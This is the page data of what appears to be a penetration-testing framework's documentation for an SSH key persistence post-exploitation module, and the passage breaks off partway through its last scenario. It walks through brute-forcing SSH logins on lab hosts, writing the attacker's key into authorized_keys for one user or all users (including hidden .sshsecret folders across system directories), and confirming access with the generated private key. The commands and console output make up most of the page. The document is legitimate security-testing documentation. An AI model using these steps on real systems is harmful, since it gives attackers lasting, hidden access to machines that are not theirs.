{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/post/linux/manage/sshkey_persistence","result":{"data":{"moduleMetadataJson":{"id":"63c3b097-c5b9-521c-ad4b-79d67403bb6e","name":"SSH Key Persistence","fullname":"post/linux/manage/sshkey_persistence","description":"This module will add an SSH key to a specified user (or all), to allow\n          remote login via SSH at any time.","rank":600,"fields":{"detailsSlug":"/modules/details/post/linux/manage/sshkey_persistence","documentationSlug":"/modules/documentation/post/linux/manage/sshkey_persistence","referencesSlug":"/modules/references/post/linux/manage/sshkey_persistence"},"documentation":{"html":"<p>This module will add an SSH key to a specified user (or all), to allow remote login on the victim via SSH at any time.</p>\n<h3 id=\"creating-a-testing-environment\" style=\"position:relative;\"><a href=\"#creating-a-testing-environment\" aria-label=\"creating a testing environment permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Creating A Testing Environment</h3>\n<p>  This module has been tested against:</p>\n<ol>\n<li>Kali Rolling</li>\n<li>Ubuntu 16.04</li>\n<li>Centos 6</li>\n<li>Fedora 20</li>\n<li>FreeBSD 9</li>\n</ol>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Start msfconsole</li>\n<li>Exploit a box via whatever method</li>\n<li>Do: <code class=\"language-text\">use post/linux/manage/sshkey_persistence</code></li>\n<li>Do: <code class=\"language-text\">set session #</code></li>\n<li>Optional Do: <code class=\"language-text\">set username</code></li>\n<li>Do: <code class=\"language-text\">set verbose true</code></li>\n<li>Optional Do: <code class=\"language-text\">Set sshd_config</code></li>\n<li>Do: <code class=\"language-text\">exploit</code></li>\n</ol>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<p>  <strong>SSHD_CONFIG</strong></p>\n<p>  Location of the sshd<em>config file on the remote system.  We use this to determine if the authorized</em>keys file location has changed on the system.  If it hasn't, we default to .ssh/authorized_keys</p>\n<p>  <strong>USERNAME</strong></p>\n<p>  If set, we only write our key to this user.  If not, we'll write to all users</p>\n<p>  <strong>PUBKEY</strong></p>\n<p>  A public key to use.  If not provided, a pub/priv key pair is generated automatically</p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"ubuntu-1604-user-level\" style=\"position:relative;\"><a href=\"#ubuntu-1604-user-level\" aria-label=\"ubuntu 1604 user level permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Ubuntu 16.04 (user level)</h3>\n<p>Get initial access</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf auxiliary(ssh_login) &gt; exploit\n\n[*] SSH - Starting bruteforce\n[+] SSH - Success: &#39;tiki:tiki&#39; &#39;uid=1000(tiki) gid=1000(tiki) groups=1000(tiki),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),117(lpadmin),118(sambashare) Linux tikiwiki 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:33:37 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux &#39;\n[!] No active DB -- Credential data will not be saved!\n[*] Command shell session 1 opened (192.168.2.229:38886 -&gt; 192.168.2.190:22) at 2016-06-19 09:52:48 -0400\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Use the post module to write the ssh key</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf auxiliary(ssh_login) &gt; use post/linux/manage/sshkey_persistence \nmsf post(sshkey_persistence) &gt; set session 1\nsession =&gt; 1\nmsf post(sshkey_persistence) &gt; set verbose true\nverbose =&gt; true\nmsf post(sshkey_persistence) &gt; set user tiki\nuser =&gt; tiki\nmsf post(sshkey_persistence) &gt; set CreateSSHFolder true\nCreateSSHFolder =&gt; true\nmsf post(sshkey_persistence) &gt; exploit\n\n[*] Checking SSH Permissions\n[+] Pubkey set to yes\n[*] Authorized Keys File: .ssh/authorized_keys\n[*] Added User SSH Path: /home/tiki/.ssh\n[*] Attempting to create ssh folders that don&#39;t exist\n[+] Storing new private key as /root/.msf4/loot/20160619095250_default_192.168.2.190_id_rsa_425588.txt\n[*] Adding key to /home/tiki/.ssh/authorized_keys\n[*] Max line length is 65537\n[*] Writing 761 bytes in 1 chunks of 2886 bytes (octal-encoded), using printf\n[+] Key Added\n[!] No active DB -- Credential data will not be saved!\n[*] Post module execution completed</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Verify our access works</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf post(sshkey_persistence) &gt; use auxiliary/scanner/ssh/ssh_login_pubkey \nmsf auxiliary(ssh_login_pubkey) &gt; set rhosts 192.168.2.190\nrhosts =&gt; 192.168.2.190\nmsf auxiliary(ssh_login_pubkey) &gt; set key_path /root/.msf4/loot/\nkey_path =&gt; /root/.msf4/loot/\nmsf auxiliary(ssh_login_pubkey) &gt; set username tiki\nusername =&gt; tiki\nmsf auxiliary(ssh_login_pubkey) &gt; run\n\n[*] 192.168.2.190:22 SSH - Testing Cleartext Keys\n[*] SSH - Testing 2 keys from /root/.msf4/loot\n[+] SSH - Success: &#39;tiki:-----BEGIN RSA PRIVATE KEY-----\n...snip...\n7m+il2AWyuPWOWEnpXRur3knruE2k97ObMH92FeI8SYaIThvqNUL\n-----END RSA PRIVATE KEY-----\n&#39; &#39;uid=1000(tiki) gid=1000(tiki) groups=1000(tiki),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),117(lpadmin),118(sambashare) Linux tikiwiki 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:33:37 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux &#39;\n[!] No active DB -- Credential data will not be saved!\n[*] Command shell session 2 opened (192.168.2.229:42580 -&gt; 192.168.2.190:22) at 2016-06-19 09:56:22 -0400\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>If you try to run for a user you don't have permissions for</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf post(sshkey_persistence) &gt; exploit\n\n[*] Checking SSH Permissions\n[+] Pubkey set to yes\n[*] Authorized Keys File: .ssh/authorized_keys\n[*] Added: /root/.ssh\n[*] Attempting to create ssh folders that don&#39;t exist\n[+] /root/.ssh\n[*] Creating /root/.ssh folder\n[-] No users found with a .ssh directory\n[*] Post module execution completed</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h3 id=\"centos-6-user-level\" style=\"position:relative;\"><a href=\"#centos-6-user-level\" aria-label=\"centos 6 user level permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>CentOS 6 (user level)</h3>\n<p>ssh keys must be enabled in sshd_config.</p>\n<p>Get Initial Access</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; use auxiliary/scanner/ssh/ssh_login\nmsf auxiliary(ssh_login) &gt; set username user\nusername =&gt; user\nmsf auxiliary(ssh_login) &gt; set password password\npassword =&gt; password\nmsf auxiliary(ssh_login) &gt; set rhosts 192.168.4.62\nrhosts =&gt; 192.168.4.62\nmsf auxiliary(ssh_login) &gt; exploit\n\n[*] SSH - Starting bruteforce\n[+] SSH - Success: &#39;user:password&#39; &#39;uid=500(user) gid=500(user) groups=500(user) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 Linux localhost.localdomain 2.6.32-71.el6.x86_64 #1 SMP Fri May 20 03:51:51 BST 2011 x86_64 x86_64 x86_64 GNU/Linux &#39;\n[!] No active DB -- Credential data will not be saved!\n[*] Command shell session 1 opened (192.168.2.229:39289 -&gt; 192.168.4.62:22) at 2016-06-19 15:27:27 -0400\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Use the post module to write the ssh key</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf auxiliary(ssh_login) &gt; use post/linux/manage/sshkey_persistence \nmsf post(sshkey_persistence) &gt; set session 1\nsession =&gt; 1\nmsf post(sshkey_persistence) &gt; set verbose true\nverbose =&gt; true\nmsf post(sshkey_persistence) &gt; set user user\nuser =&gt; user\nmsf post(sshkey_persistence) &gt; exploit\n\n[*] Checking SSH Permissions\n[*] Authorized Keys File: .ssh/authorized_keys\n[*] Added User SSH Path: /home/user/.ssh\n[*] Attempting to create ssh folders that don&#39;t exist\n[+] Storing new private key as /root/.msf4/loot/20160619152757_default_192.168.4.62_id_rsa_633695.txt\n[*] Creating /home/user/.ssh/authorized_keys\n[*] Max line length is 65537\n[*] Writing 380 bytes in 1 chunks of 1447 bytes (octal-encoded), using printf\n[+] Key Added\n[!] No active DB -- Credential data will not be saved!\n[*] Post module execution completed</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Verify our access works</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf post(sshkey_persistence) &gt; use auxiliary/scanner/ssh/ssh_login_pubkey \nmsf auxiliary(ssh_login_pubkey) &gt; set rhosts 192.168.4.62\nrhosts =&gt; 192.168.4.62\nmsf auxiliary(ssh_login_pubkey) &gt; set key_path /root/.msf4/loot/\nkey_path =&gt; /root/.msf4/loot/\nmsf auxiliary(ssh_login_pubkey) &gt; set username user\nusername =&gt; user\nmsf auxiliary(ssh_login_pubkey) &gt; run\n\n[*] 192.168.4.62:22 SSH - Testing Cleartext Keys\n[*] SSH - Testing 6 keys from /root/.msf4/loot\n[+] SSH - Success: &#39;user:-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA8xtiDZrE6XgkOJaatg+TvUcrEr92/GDSZUtEqO9RvvvPO1Yt\n...snip...\nUbz5hiBypg1/C2TMB9jH3QLKmT66Te7rfym7rOBIgIJKivs5JLZe7w==\n-----END RSA PRIVATE KEY-----\n&#39; &#39;uid=500(user) gid=500(user) groups=500(user) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 Linux localhost.localdomain 2.6.32-71.el6.x86_64 #1 SMP Fri May 20 03:51:51 BST 2011 x86_64 x86_64 x86_64 GNU/Linux &#39;\n[!] No active DB -- Credential data will not be saved!\n[*] Command shell session 2 opened (192.168.2.229:34721 -&gt; 192.168.4.62:22) at 2016-06-19 15:49:34 -0400\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h3 id=\"centos-6-root\" style=\"position:relative;\"><a href=\"#centos-6-root\" aria-label=\"centos 6 root permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>CentOS 6 (root)</h3>\n<p>The following sshd_config changes were made:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">PubkeyAuthentication yes\nAuthorizedKeysFile\t.sshsecret/.authorized_keys\nPermitRootLogin yes</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span></span></pre></div>\n<p>Get Initial Access</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; use auxiliary/scanner/ssh/ssh_login\nmsf auxiliary(ssh_login) &gt; set username root\nusername =&gt; root\nmsf auxiliary(ssh_login) &gt; set password pass\npassword =&gt; pass\nmsf auxiliary(ssh_login) &gt; set rhosts 192.168.4.62\nrhosts =&gt; 192.168.4.62\nmsf auxiliary(ssh_login) &gt; exploit\n\n[*] SSH - Starting bruteforce\n[+] SSH - Success: &#39;root:pass&#39; &#39;uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 Linux localhost.localdomain 2.6.32-71.el6.x86_64 #1 SMP Fri May 20 03:51:51 BST 2011 x86_64 x86_64 x86_64 GNU/Linux &#39;\n[!] No active DB -- Credential data will not be saved!\n[*] Command shell session 1 opened (192.168.2.229:46420 -&gt; 192.168.4.62:22) at 2016-06-19 15:58:32 -0400\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Use the post module to write the ssh key.  Keep in mind NOT setting a user (targeted), and CreateSSHFolder will possibly make MANY folders/files as can be observed below.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf auxiliary(ssh_login) &gt; use post/linux/manage/sshkey_persistence \nmsf post(sshkey_persistence) &gt; set session 1\nsession =&gt; 1\nmsf post(sshkey_persistence) &gt; set verbose true\nverbose =&gt; true\nmsf post(sshkey_persistence) &gt; set CreateSSHFolder true\nCreateSSHFolder =&gt; true\nmsf post(sshkey_persistence) &gt; exploit\n\n[*] Checking SSH Permissions\n[+] Pubkey set to yes\n[*] Authorized Keys File: .sshsecret/.authorized_keys\n[*] Finding .sshsecret directories\n[*] Attempting to create ssh folders that don&#39;t exist\n[*] Creating //.sshsecret folder\n[*] Creating /bin/.sshsecret folder\n[*] Creating /dev/.sshsecret folder\n[*] Creating /etc/abrt/.sshsecret folder\n[*] Creating /etc/ntp/.sshsecret folder\n[*] Creating /proc/.sshsecret folder\n[*] Creating /root/.sshsecret folder\n[*] Creating /sbin/.sshsecret folder\n[*] Creating /usr/games/.sshsecret folder\n[*] Creating /var/adm/.sshsecret folder\n[*] Creating /var/cache/rpcbind/.sshsecret folder\n[*] Creating /var/empty/saslauth/.sshsecret folder\n[*] Creating /var/empty/sshd/.sshsecret folder\n[*] Creating /var/ftp/.sshsecret folder\n[*] Creating /var/gopher/.sshsecret folder\n[*] Creating /var/lib/avahi-autoipd/.sshsecret folder\n[*] Creating /var/lib/gdm/.sshsecret folder\n[*] Creating /var/lib/hsqldb/.sshsecret folder\n[*] Creating /var/lib/mysql/.sshsecret folder\n[*] Creating /var/lib/nfs/.sshsecret folder\n[*] Creating /var/run/avahi-daemon/.sshsecret folder\n[*] Creating /var/run/pulse/.sshsecret folder\n[*] Creating /var/spool/lpd/.sshsecret folder\n[*] Creating /var/spool/mail/.sshsecret folder\n[*] Creating /var/spool/postfix/.sshsecret folder\n[*] Creating /var/spool/uucp/.sshsecret folder\n[*] Creating /var/www/.sshsecret folder\n[+] Storing new private key as /root/.msf4/loot/20160619155920_default_192.168.4.62_id_rsa_271813.txt\n[*] Creating //.sshsecret/.authorized_keys\n[*] Max line length is 65537\n[*] Writing 380 bytes in 1 chunks of 1458 bytes (octal-encoded), using printf\n[+] Key Added\n[!] No active DB -- Credential data will not be saved!\n[*] Creating /bin/.sshsecret/.authorized_keys\n[*] Max line length is 65537\n[*] Writing 380 bytes in 1 chunks of 1458 bytes (octal-encoded), using printf\n[+] Key Added\n[*] Creating /dev/.sshsecret/.authorized_keys\n[*] Max line length is 65537\n[*] Writing 380 bytes in 1 chunks of 1458 bytes (octal-encoded), using printf\n[+] Key Added\n[*] Creating /etc/abrt/.sshsecret/.authorized_keys\n[*] Max line length is 65537\n[*] Writing 380 bytes in 1 chunks of 1458 bytes (octal-encoded), using printf\n[+] Key Added\n[*] Creating /etc/ntp/.sshsecret/.authorized_keys\n[*] Max line length is 65537\n[*] Writing 380 bytes in 1 chunks of 1458 bytes (octal-encoded), using printf\n[+] Key Added\n[*] Adding key to /home/user/.sshsecret/.authorized_keys\n[*] Max line length is 65537\n[*] Writing 761 bytes in 1 chunks of 2910 bytes (octal-encoded), using printf\n[+] Key Added\n[*] Creating /root/.sshsecret/.authorized_keys\n[*] Max line length is 65537\n[*] Writing 380 bytes in 1 chunks of 1458 bytes (octal-encoded), using printf\n[+] Key Added\n[*] Creating /sbin/.sshsecret/.authorized_keys\n[*] Max line length is 65537\n[*] Writing 380 bytes in 1 chunks of 1458 bytes (octal-encoded), using printf\n[+] Key Added\n[*] Creating /usr/games/.sshsecret/.authorized_keys\n[*] Max line length is 65537\n[*] Writing 380 bytes in 1 chunks of 1458 bytes (octal-encoded), using printf\n[+] Key Added\n[*] Creating /var/adm/.sshsecret/.authorized_keys\n[*] Max line length is 65537\n[*] Writing 380 bytes in 1 chunks of 1458 bytes (octal-encoded), using printf\n[+] Key Added\n[*] Creating /var/cache/rpcbind/.sshsecret/.authorized_keys\n[*] Max line length is 65537\n[*] Writing 380 bytes in 1 chunks of 1458 bytes (octal-encoded), using printf\n[+] Key Added\n[*] Creating /var/empty/saslauth/.sshsecret/.authorized_keys\n[*] Max line length is 65537\n[*] Writing 380 bytes in 1 chunks of 1458 bytes (octal-encoded), using printf\n[+] Key Added\n[*] Creating /var/empty/sshd/.sshsecret/.authorized_keys\n[*] Max line length is 65537\n[*] Writing 380 bytes in 1 chunks of 1458 bytes (octal-encoded), using printf\n[+] Key Added\n[*] Creating /var/ftp/.sshsecret/.authorized_keys\n[*] Max line length is 65537\n[*] Writing 380 bytes in 1 chunks of 1458 bytes (octal-encoded), using printf\n[+] Key Added\n[*] Creating /var/gopher/.sshsecret/.authorized_keys\n[*] Max line length is 65537\n[*] Writing 380 bytes in 1 chunks of 1458 bytes (octal-encoded), using printf\n[+] Key Added\n[*] Creating /var/lib/avahi-autoipd/.sshsecret/.authorized_keys\n[*] Max line length is 65537\n[*] Writing 380 bytes in 1 chunks of 1458 bytes (octal-encoded), using printf\n[+] Key Added\n[*] Creating /var/lib/gdm/.sshsecret/.authorized_keys\n[*] Max line length is 65537\n[*] Writing 380 bytes in 1 chunks of 1458 bytes (octal-encoded), using printf\n[+] Key Added\n[*] Creating /var/lib/hsqldb/.sshsecret/.authorized_keys\n[*] Max line length is 65537\n[*] Writing 380 bytes in 1 chunks of 1458 bytes (octal-encoded), using printf\n[+] Key Added\n[*] Creating /var/lib/mysql/.sshsecret/.authorized_keys\n[*] Max line length is 65537\n[*] Writing 380 bytes in 1 chunks of 1458 bytes (octal-encoded), using printf\n[+] Key Added\n[*] Creating /var/lib/nfs/.sshsecret/.authorized_keys\n[*] Max line length is 65537\n[*] Writing 380 bytes in 1 chunks of 1458 bytes (octal-encoded), using printf\n[+] Key Added\n[*] Creating /var/run/avahi-daemon/.sshsecret/.authorized_keys\n[*] Max line length is 65537\n[*] Writing 380 bytes in 1 chunks of 1458 bytes (octal-encoded), using printf\n[+] Key Added\n[*] Creating /var/run/pulse/.sshsecret/.authorized_keys\n[*] Max line length is 65537\n[*] Writing 380 bytes in 1 chunks of 1458 bytes (octal-encoded), using printf\n[+] Key Added\n[*] Creating /var/spool/lpd/.sshsecret/.authorized_keys\n[*] Max line length is 65537\n[*] Writing 380 bytes in 1 chunks of 1458 bytes (octal-encoded), using printf\n[+] Key Added\n[*] Creating /var/spool/mail/.sshsecret/.authorized_keys\n[*] Max line length is 65537\n[*] Writing 380 bytes in 1 chunks of 1458 bytes (octal-encoded), using printf\n[+] Key Added\n[*] Creating /var/spool/postfix/.sshsecret/.authorized_keys\n[*] Max line length is 65537\n[*] Writing 380 bytes in 1 chunks of 1458 bytes (octal-encoded), using printf\n[+] Key Added\n[*] Creating /var/spool/uucp/.sshsecret/.authorized_keys\n[*] Max line length is 65537\n[*] Writing 380 bytes in 1 chunks of 1458 bytes (octal-encoded), using printf\n[+] Key Added\n[*] Creating /var/www/.sshsecret/.authorized_keys\n[*] Max line length is 65537\n[*] Writing 380 bytes in 1 chunks of 1458 bytes (octal-encoded), using printf\n[+] Key Added\n[*] Post module execution completed</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h3 id=\"freebsd9-root\" style=\"position:relative;\"><a href=\"#freebsd9-root\" aria-label=\"freebsd9 root permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>FreeBSD9 (root)</h3>\n<p>Several sshd_config mods were needed to allow root login, and enable the service to run correctly.</p>\n<p>Get Initial Access</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; use auxiliary/scanner/ssh/ssh_login\nmsf auxiliary(ssh_login) &gt; set username root\nusername =&gt; 